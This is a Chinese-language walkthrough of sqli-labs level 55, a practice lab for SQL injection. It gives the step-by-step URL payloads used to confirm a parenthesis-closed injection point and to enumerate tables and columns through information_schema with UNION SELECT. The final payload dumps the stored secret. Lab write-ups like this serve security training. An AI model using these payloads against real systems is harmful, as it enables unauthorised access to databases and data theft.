## sql-labs第五十五关

五十五关是有14次机会，id参数是加了括号的整数，还是正常流程，先闭合再拖库

![](./img/a516af628f76da9d8d35643c816d811a.png)

![Less-55-01](.\img\Less-55-01.PNG)



~~~ cmd
?id=1
~~~

![Less-55-02](.\img\Less-55-02.PNG)





~~~ cmd
?id=1)
~~~

![Less-55-03](.\img\Less-55-03.PNG)



两者不一致，说明这里存在`sql`注入点



~~~ cmd
?id=1) union select 1,2,3--+
~~~

![Less-55-04](.\img\Less-55-04.PNG)



~~~ cmd
?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()--+
~~~

![Less-55-05](.\img\Less-55-05.PNG)



~~~ cmd
?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name="2F1CH3L20D"--+
~~~

![Less-55-06](.\img\Less-55-06.PNG)



~~~ cmd
?id=-1) union select 1,group_concat(secret_A8VM),3 from 2F1CH3L20D--+
~~~

![Less-55-07](.\img\Less-55-07.PNG)



由此成功爆破出`secret_key`
